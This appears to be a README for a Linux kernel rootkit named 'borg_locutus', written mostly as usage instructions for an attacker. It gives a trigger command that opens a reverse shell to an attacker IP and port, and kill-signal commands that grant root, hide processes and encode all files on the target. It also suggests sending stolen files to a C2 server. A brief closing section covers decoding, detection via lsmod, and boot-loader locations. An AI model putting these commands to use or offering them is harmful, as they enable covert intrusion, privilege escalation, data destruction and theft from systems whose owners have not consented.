This rootkit is a fusion from different projects I looked at and is used to get: a persistent icmp backdoor, root access, process hiding, file encoder, directory and file hiding.

usage:
get a reverse shell by running borg_locutus/trigger.sh <target ip> <attacker ip> <attacker port>
get root by using kill -64 $RANDOM
hide a process by using kill -63 pid
encode all files on the target with kill -62 $RANDOM 
you can even extend the encoder to send all interesting files encoded to a c2. To do this you need to change: c2_addr, c2_port in enc.py

Mitigation:
You can decode any file by changing two chars in the enc.py file. You need to change the call to encode to decode.
To detect this rootkit you could just use lsmod | grep locutus. To remove it you need to reboot the machine and first remove any functionality which loads the module at boot time. 
Usual places for such loaders are /etc/modules, /etc/crontab, /etc/cron.d, /etc/init.d.
